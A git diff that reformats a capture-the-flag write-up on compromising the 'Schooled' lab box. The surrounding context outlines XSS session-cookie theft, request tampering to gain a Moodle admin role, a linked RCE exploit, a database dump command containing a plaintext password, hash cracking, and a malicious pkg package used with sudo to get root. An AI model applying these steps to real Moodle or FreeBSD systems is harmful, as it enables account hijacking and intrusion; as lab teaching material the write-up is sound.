@@ -38,12 +38,16 @@ Lets Begin!
 
 We kick it off w a usual nmap scan . In this case a default script and version scan w the verbose flag to see open ports on the fly without having to wait for the scan to finish.
 
-<img src="images/schooled1.png" alt="">
+<p align="center">
+ <img src="images/schooled1.png">
+</p>
 
 
 Scanning for all ports just to be safe show mysql is running on port 33060.
 
-<img src="images/schooled2.png" alt="">
+<p align="center">
+ <img src="images/schooled2.png">
+</p>
 
 Trying to see if we can remotely access the database results in no access. 
 
@@ -51,12 +55,16 @@ Moving on! We begin by looking at the server at port 80 as always....
 
 Looking at page source suggests for adding an entry in hosts list . Add schooled.htb to your /etc/hosts and continue browsing the site . 
 
-<img src="images/schooled3.png" alt="">
+<p align="center">
+ <img src="images/schooled3.png">
+</p>
 
 
 Looking at the about us page . We discover The possble cms used - Moodle!
 
-<img src="images/schooled4.png" alt="">
+<p align="center">
+ <img src="images/schooled4.png">
+</p>
 
 
 
@@ -79,7 +87,7 @@ Directory bruteforcing w Gobuster and such dosen't result in anything too useful
 
 So far info discovered:
 
-```
+```bash
 mail: admissions@schooled.htb
 From wappalyzer: Php 7.4.15, Apache2, Bootstrap 4.1.0
 ```
@@ -91,7 +99,9 @@ Using gobuster for vhost bruteforcing i found : *moodle.schooled.htb*
 
 Add moodle.schooled.htb to your /etc/hosts list and browse to it.
 
-<img src="images/schooled5.png" alt="">
+<p align="center">
+ <img src="images/schooled5.png">
+</p>
 
 Visiting the page lets us signup without a confirmation!
 
@@ -121,11 +131,15 @@ I setup my xss-server w this simple python script ..... you can use a basic pyth
 
 - paste it in the user settings section
 
-<img src="images/schooled6.png" alt="">
+<p align="center">
+ <img src="images/schooled6.png">
+</p>
 
 wait for a few seconds and recieve the teachers cookie on your xss-server.
 
-<img src="images/schooled7.png" alt="">
+<p align="center">
+ <img src="images/schooled7.png">
+</p>
 
 - Copy this cookie --> Inspect Element --> Storage --> replace MoodleSession's value to the cookie --> refresh the pg/ F5 to. You're Now Manuel Phillips - Teacher!
 
@@ -151,13 +165,17 @@ Click on the Enroll Users option and enroll Lianne carter. Switch on intercept i
 - Send the request to repeater and change the following 2 values to match that of your current teacher(id=24).
 Changed these params to match: userlist%5B%5D=24&roletoassign=1. (Changing user id to teachers id == 24 and changing role to admin == 1)
 
-<img src="images/schooled8.png" alt="">
+<p align="center">
+ <img src="images/schooled8.png">
+</p>
 
 Send the request and stop intercept after.
 
 - From here click on Lianne carter's profile from the below list. Note to see the diff of and Administration button on the side .
 
-<img src="images/schooled9.png" alt="">
+<p align="center">
+ <img src="images/schooled9.png">
+</p>
 
 Click on it and now we have higher privs!
 
@@ -165,7 +183,9 @@ Click on it and now we have higher privs!
 
 - Click on Users --> define roles --> Click on the 'edit' icon in the manager role. Turn intercept on before you do and add the payload from the poc described . Forward to request to get full privs!
 
-<img src="images/schooled10.png" alt="">
+<p align="center">
+ <img src="images/schooled10.png">
+</p>
 
 - Next grab rce.zip from [here](https://github.com/HoangKien1020/Moodle_RCE)
 
@@ -191,7 +211,9 @@ Poking around and looking for config files , we find the apache dir and moodle d
 
 Checking the file **config.php** in dir:
 
-<img src="images/schooled11.jpg" alt="">
+<p align="center">
+ <img src="images/schooled11.jpg">
+</p>
 
 
 We get db creds as  *moodle:P################0* 
@@ -209,7 +231,9 @@ then:
 - mysql -u moodle -pPlaybookMaster2020 -e 'use moodle; select * from mdl_user;' --> db creds dump. 
 
 
-<img src="images/schooled12.png" alt="">
+<p align="center">
+ <img src="images/schooled12.png">
+</p>
 
 Jamie's account here is of interest as he is one of the users on the box.
 This hash is a bcrypt hash.
@@ -218,7 +242,9 @@ use your favorite cracker to crack this one .
 
 Im using john the ripper for this instance
 
-<img src="images/schooled13.jpg" alt= "">
+<p align="center">
+ <img src="images/schooled13.jpg">
+</p>
 
 
 We finally found Jamies creds : 
@@ -235,7 +261,9 @@ Get user.txt!
 
 Performing a basic sudo -l give us:
 
-<img src="images/schooled14.png" alt="">
+<p align="center">
+ <img src="images/schooled14.png">
+</p>
 
 Poking around the internet and doing some good research on what the command is we find that it is a distinct binary that is replaced by the bootstrapped binary during the initial installation process.
 
@@ -247,7 +275,7 @@ After reading the article i put it all as a single script modified parts of it .
 
 The script :
 
-```
+```bash
 #!/bin/sh
 STAGEDIR=/tmp/stage
 rm -rf ${STAGEDIR}
@@ -286,10 +314,14 @@ pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -p ${STAGEDIR}/plist -o .
 - execute the script and note to see a package made named : mypackage-1.0_5.txz.
 - Run : ***sudo /usr/sbin/pkg install --no-repo-update mypackage-1.0_5.txz*** (no repo update to stop it from check from an online source) and start a listener.
 
-<img src="images/schooled15.png" alt="">
+<p align="center">
+ <img src="images/schooled15.png">
+</p>
 
 
-<img src="images/schooled16.png" alt="">
+<p align="center">
+ <img src="images/schooled16.png">
+</p>
 
 
 You now have root.
